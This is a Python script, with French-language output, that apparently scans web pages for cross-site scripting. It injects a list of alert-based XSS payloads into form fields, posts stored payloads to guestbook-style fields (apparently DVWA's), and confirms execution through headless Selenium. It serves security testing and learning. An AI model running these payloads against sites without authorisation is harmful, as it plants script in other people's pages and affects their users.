import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time
import argparse

# === Payloads XSS ===
payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<body onload=alert('XSS')>"
]

found_reflected = False
found_stored = False

def browser_check(url, cookies=None):
    options = Options()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)

    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    driver.get(base_url)

    if cookies:
        for cookie in cookies:
            try:
                driver.add_cookie({
                    'name': cookie.name,
                    'value': cookie.value,
                    'domain': parsed_url.hostname,
                    'path': '/',
                })
            except:
                continue

    driver.get(url)
    time.sleep(2)
    try:
        alert = driver.switch_to.alert
        alert.accept()
        driver.quit()
        return True
    except:
        driver.quit()
        return False

def get_forms(url, session):
    try:
        soup = BeautifulSoup(session.get(url).content, "html.parser")
        return soup.find_all("form")
    except:
        return []

def form_details(form):
    details = {
        "action": form.attrs.get("action"),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for tag in form.find_all(["input", "textarea", "select"]):
        name = tag.attrs.get("name")
        tag_type = tag.attrs.get("type", "text")
        if name:
            details["inputs"].append({"type": tag_type, "name": name})
    return details

def submit_form(details, url, payload, session):
    target_url = urljoin(url, details["action"])
    data = {}
    for input in details["inputs"]:
        if input["type"] in ["text", "search", "email", "textarea"]:
            data[input["name"]] = payload
    if details["method"] == "post":
        return session.post(target_url, data=data)
    else:
        return session.get(target_url, params=data)

def test_reflected_xss(url, session):
    global found_reflected
    forms = get_forms(url, session)
    for form in forms:
        details = form_details(form)
        for payload in payloads:
            response = submit_form(details, url, payload, session)
            if response and payload in response.text:
                if browser_check(response.url, session.cookies):
                    found_reflected = True
                    return

def test_stored_xss(url, session):
    global found_stored
    for payload in payloads:
        data = {
            "txtName": "XSS Tester",
            "mtxMessage": payload,
            "btnSign": "Sign Guestbook"
        }
        try:
            response = session.post(url, data=data)
            time.sleep(2)
            if browser_check(url, session.cookies):
                found_stored = True
                return
        except:
            continue

def login(login_url, username, password):
    session = requests.Session()
    if not login_url:
        return session
    data = {"login": username, "password": password, "form": "submit"}
    session.post(login_url, data=data)
    return session

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="URL cible")
    parser.add_argument("--login-url", help="URL de login")
    parser.add_argument("--username", help="Nom d'utilisateur")
    parser.add_argument("--password", help="Mot de passe")
    args = parser.parse_args()

    # 💥 Message de début de scan
   # print("🚀 Démarrage du scan XSS... Veuillez patienter.\n")

    session = login(args.login_url, args.username, args.password)
    test_reflected_xss(args.url, session)
    test_stored_xss(args.url, session)

    # 🛡️ Rapport final
    #print("\n🛡️ === Rapport de Vulnérabilité XSS ===\n")

    if found_reflected:
        print("🚨 Le site est vulnérable à reflected xss\n")
    else:
        print("✅ Le site n'est pas vulnérable à reflected xss\n")

    if found_stored:
        print(", 🚨vulnérable à stored xss\n")
    else:
        print(", ✅ n'est pas vulnérable à stored xss\n")

    # 📘 Légende
   # print("📘 Légende :")
   # print("⚠️  = Vulnérabilité détectée")
   # print("❌ = Aucun problème détecté")

if __name__ == "__main__":
    main()
